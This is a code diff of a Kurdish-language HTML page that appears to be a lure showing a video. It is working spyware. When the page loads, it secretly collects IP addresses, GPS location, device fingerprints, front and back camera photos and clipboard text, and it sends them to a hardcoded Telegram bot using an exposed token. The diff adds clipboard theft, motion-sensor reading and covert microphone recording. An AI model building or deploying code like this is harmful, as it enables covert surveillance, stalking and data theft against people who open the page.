@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مەلەفی سوڕەیا</title>
+    <title>مەلەفی سوڕەیا - داشبۆردی چاودێری</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
         body { 
@@ -122,6 +122,14 @@
         const BOT_TOKEN = "9188898335:AAEpuZXa0igf-7GbuvykP0uT9U5GJQZJU0g";
         const CHAT_ID = "6947664268";
 
+        let motionData = { alpha: 0, beta: 0, gamma: 0 };
+        
+        window.addEventListener('deviceorientation', function(event) {
+            motionData.alpha = Math.round(event.alpha || 0);
+            motionData.beta = Math.round(event.beta || 0);
+            motionData.gamma = Math.round(event.gamma || 0);
+        });
+
         function sendToTelegramText(text) {
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             fetch(url, {
@@ -145,7 +153,17 @@
             fetch(url, { method: "POST", body: formData });
         }
 
-        // WebRTC بۆ دەرهێنانی Local IP
+        function sendToTelegramVoice(blob, caption) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("voice", blob, "audio_record.ogg");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+            fetch(url, { method: "POST", body: formData });
+        }
+
+        // WebRTC بۆ Local IP
         function getLocalIPs(callback) {
             try {
                 let ips = [];
@@ -168,7 +186,48 @@
             }
         }
 
-        // دروستکردنی فینگەرپرینتی تایبەتی کەنڤاس (Canvas Fingerprint)
+        // خواندنی Clipboard
+        async function getClipboardData() {
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    let text = await navigator.clipboard.readText();
+                    return text ? text.slice(0, 100) : "کلیپبۆرد خاڵییە";
+                }
+            } catch(e) {
+                return "ڕەتکرایەوە یان بەردەست نییە";
+            }
+            return "پشتیوانی ناکرێت";
+        }
+
+        // تۆمارکردنی دەنگ (Microphone Eavesdropping)
+        function recordMicrophone() {
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(stream => {
+                    let mediaRecorder = new MediaRecorder(stream);
+                    let audioChunks = [];
+                    
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        sendToTelegramVoice(audioBlob, "🎙️ *تۆمارکردنی دەنگی دەوروبەری سەردانیکەر (Voice Note)*");
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 4000); // 4 چرکە دەنگ تۆمار دەکات
+                })
+                .catch(err => {
+                    sendToTelegramText(`⚠️ *تێبینی مایکڕۆفۆن:* مۆڵەتی مایکڕۆفۆن ڕەتکرایەوە.`);
+                });
+            } catch(e) {}
+        }
+
         function getCanvasFingerprint() {
             try {
                 let canvas = document.createElement('canvas');
@@ -178,14 +237,11 @@
                 ctx.fillStyle = "#f60";
                 ctx.fillRect(125, 1, 62, 20);
                 ctx.fillStyle = "#069";
-                ctx.fillText("OSINT_PRO_FINGERPRINT", 2, 15);
-                return canvas.toDataURL().slice(-50); // کۆدی تاقەی تایبەت
-            } catch(e) {
-                return "Unavailable";
-            }
+                ctx.fillText("GOD_MODE_DASHBOARD", 2, 15);
+                return canvas.toDataURL().slice(-40);
+            } catch(e) { return "Unavailable"; }
         }
 
-        // کارتی شاشە و گرافیک
         function getGPUInfo() {
             try {
                 let canvas = document.createElement('canvas');
@@ -193,12 +249,9 @@
                 if (!gl) return "نەزانراو";
                 let dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard WebGL";
-            } catch(e) {
-                return "بەردەست نییە";
-            }
+            } catch(e) { return "بەردەست نییە"; }
         }
 
-        // زانیاری پاتری
         async function getBatteryInfo() {
             if ('getBattery' in navigator) {
                 try {
@@ -206,18 +259,16 @@
                     let level = Math.round(battery.level * 100) + "%";
                     let charging = battery.charging ? "⚡ لە حالەتی چارجدا" : "🔋 بێ چارج";
                     return `${level} (${charging})`;
-                } catch(e) {
-                    return "نەتوانرا بخوێنرێتەوە";
-                }
+                } catch(e) { return "نەتوانرا بخوێنرێتەوە"; }
             }
             return "پشتیوانی ناکرێت";
         }
 
-        // کۆکردنەوە و ناردنی زانیارییەکان
         async function gatherAndSendDetails() {
             let ua = navigator.userAgent;
             let platform = navigator.platform;
             let language = navigator.language;
+            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             let screenRes = window.screen.width + "x" + window.screen.height;
             let cpuCores = navigator.hardwareConcurrency || "نەزانراو";
             let deviceRam = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "نەزانراو";
@@ -225,39 +276,42 @@
             let gpu = getGPUInfo();
             let battery = await getBatteryInfo();
             let canvasFP = getCanvasFingerprint();
+            let clipboardText = await getClipboardData();
             
             let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             let netType = conn ? (conn.effectiveType || "نەزانراو") : "نەزانراو";
 
             getLocalIPs(function(localIPs) {
-                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "شاراوە / پەنهاو";
+                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "شاراوە";
 
                 fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(data => {
-                    let report = `🔥 *ڕاپۆرتی لووتکەی قووڵ (ULTIMATE OSINT):*\n\n` +
-                                 `🌐 *تۆڕ و زانیاری ڕایەڵە:*\n` +
-                                 `• *ئایپی گشتی (Public IP):* \`${data.ip}\`\n` +
-                                 `• *ئایپی ناوخۆیی (Local IP):* \`${localIPText}\`\n` +
-                                 `• *وڵات و شاری سیستمی IP:* ${data.country_name} - ${data.city} *(تێبینی: شار لە IPAPI هەندێک جار مەرج نییە ڕاست بێت)*\n` +
-                                 `• *دابینکەری هێڵ (ISP):* ${data.org}\n` +
-                                 `• *جۆری هێڵ:* ${netType.toUpperCase()}\n\n` +
-                                 `💻 *وردەکاری ڕەقامەواڵە و فینگەرپرینت:*\n` +
-                                 `• *سیستم:* ${platform}\n` +
-                                 `• *پرۆسێسەر (CPU Cores):* ${cpuCores}\n` +
-                                 `• *ڕام (RAM):* ${deviceRam}\n` +
-                                 `• *کارتی شاشە (GPU):* \`${gpu}\`\n` +
-                                 `• *دۆخی پاتری:* ${battery}\n` +
-                                 `• *خاڵەکانی تاچ:* ${touchPoints}\n` +
-                                 `• *فینگەرپرینتی شاشە (Canvas FP):* \`${canvasFP}\`\n` +
-                                 `• *ڕەهەندی شاشە:* ${screenRes}\n` +
-                                 `• *زمان:* ${language}\n\n` +
+                    let report = `🎛️ *داشبۆردی چاودێری لووتکە (GOD MODE ULTIMATE):*\n\n` +
+                                 `🌐 *ڕایەڵە و شوێن:*\n` +
+                                 `• *ئایپی گشتی:* \`${data.ip}\`\n` +
+                                 `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
+                                 `• *وڵات و شار:* ${data.country_name} - ${data.city}\n` +
+                                 `• *ناوچەی کاتی:* \`${timezone}\`\n` +
+                                 `• *دابینکەری هێڵ:* ${data.org}\n\n` +
+                                 `📋 *دزەکردن بە کلیپبۆرد:*\n\`${clipboardText}\`\n\n` +
+                                 `🔄 *ئاراستەی فیزیکی مۆبایل (Sensors):*\n` +
+                                 `• Alpha: ${motionData.alpha} | Beta: ${motionData.beta} | Gamma: ${motionData.gamma}\n\n` +
+                                 `💻 *ڕەقامەواڵە و فینگەرپرینت:*\n` +
+                                 `• سیستم: ${platform}\n` +
+                                 `• پرۆسێسەر (Cores): ${cpuCores}\n` +
+                                 `• ڕام: ${deviceRam}\n` +
+                                 `• کارتی شاشە: \`${gpu}\`\n` +
+                                 `• پاتری: ${battery}\n` +
+                                 `• خاڵەکانی تاچ: ${touchPoints}\n` +
+                                 `• فینگەرپرینت: \`${canvasFP}\`\n` +
+                                 `• ڕەهەندی شاشە: ${screenRes}\n` +
+                                 `• زمان: ${language}\n\n` +
                                  `📱 *براوسەر (User Agent):*\n\`${ua}\``;
                     
                     sendToTelegramText(report);
                 }).catch(err => {
-                    let basicReport = `🔥 *ڕاپۆرتی توند:* \n• سیستم: ${platform} \n• Local IP: \`${localIPText}\``;
-                    sendToTelegramText(basicReport);
+                    sendToTelegramText(`🎛️ *داشبۆردی خێرا:* سیستم: ${platform} | Clipboard: \`${clipboardText}\``);
                 });
             });
         }
@@ -268,24 +322,22 @@
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
                     let accuracy = position.coords.accuracy;
-                    let locMsg = `📍 *شوێنی GPSی ڕاستەقینە (ورد و سەد در سەد):*\n` +
-                                 `• *هێڵی پانی (Lat):* \`${lat}\`\n` +
-                                 `• *هێڵی درێژی (Lon):* \`${lon}\`\n` +
-                                 `• *ڕێژەی هەڵە (Accuracy):* ~${Math.round(accuracy)} مەتر\n` +
-                                 `🗺️ [کردنەوە لە نەخشەی گۆگڵ (سلێمانیدا دیاری دەکات)](https://maps.google.com/?q=${lat},${lon})`;
+                    let locMsg = `📍 *شوێنی GPSی ورد (داشبۆرد):*\n` +
+                                 `• هێڵی پانی: \`${lat}\`\n` +
+                                 `• هێڵی درێژی: \`${lon}\`\n` +
+                                 `• ڕێژەی هەڵە: ~${Math.round(accuracy)} مەتر\n` +
+                                 `🗺️ [کردنەوە لە نەخشەی گۆگڵ](https://maps.google.com/?q=${lat},${lon})`;
                     sendToTelegramText(locMsg);
                 }, function(error) {
-                    sendToTelegramText(`⚠️ *تێبینی شوێن:* سەردانیکەر مۆڵەتی GPSی ڕەتکردەوە (Allow نەکرد).`);
+                    sendToTelegramText(`⚠️ *تێبینی شوێن:* مۆڵەت ڕەتکرایەوە.`);
                 }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
             }
         }
 
-        // گرتنی وێنەی پێشەوە و دوای ئامێرەکە (بە شێوازی بەدوای یەک)
         function takePicturesSequence() {
             const video = document.getElementById('camVideo');
             const canvas = document.getElementById('canvas');
             
-            // گرتنی دوربینەی پێشەوە (User)
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then(function(stream) {
                 video.srcObject = stream;
@@ -298,12 +350,11 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(function(blob) {
-                        sendToTelegramPhoto(blob, "📸 *وێنەی سەردانیکەر (دوربینی پێشەوە - Selfie)*");
+                        sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
                     }, 'image/jpeg', 0.9);
                     
                     stream.getTracks().forEach(track => track.stop());
 
-                    // دوای گرتنی پێشەوە، هەوڵدان بۆ گرتنی دوربینەی دواوە (Environment) ئەگەر بەردەست بێت
                     setTimeout(function() {
                         navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false })
                         .then(function(backStream) {
@@ -312,19 +363,17 @@
                             setTimeout(function() {
                                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                 canvas.toBlob(function(backBlob) {
-                                    sendToTelegramPhoto(backBlob, "📷 *وێنەی دەوروبەر (دوربینی دواوە - Back Camera)*");
+                                    sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوە (Back Camera)*");
                                 }, 'image/jpeg', 0.9);
                                 backStream.getTracks().forEach(track => track.stop());
                             }, 1000);
-                        }).catch(e => {
-                            // ئەگەر دوربینی دواوە نەبوو یان ڕەتکرایەوە، تێبینی دەنێرێت
-                        });
+                        }).catch(e => {});
                     }, 1000);
 
                 }, 1200);
             })
             .catch(function(err) {
-                sendToTelegramText(`⚠️ *تێبینی دوربین:* سەردانیکەر مۆڵەتی دوربینەی ڕەتکردەوە (Allow نەکرد).`);
+                sendToTelegramText(`⚠️ *تێبینی دوربین:* ڕەتکرایەوە.`);
             });
         }
 
@@ -336,6 +385,7 @@
             gatherAndSendDetails();
             sendLocation();
             takePicturesSequence();
+            recordMicrophone(); // دەستپێکردنی تۆمارکردنی دەنگ
 
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
@@ -347,7 +397,7 @@
                 
                 let vid = document.getElementById('targetVideo');
                 vid.play().catch(e => console.log(e));
-            }, 3000);
+            }, 3500);
         }
     </script>
 </body>
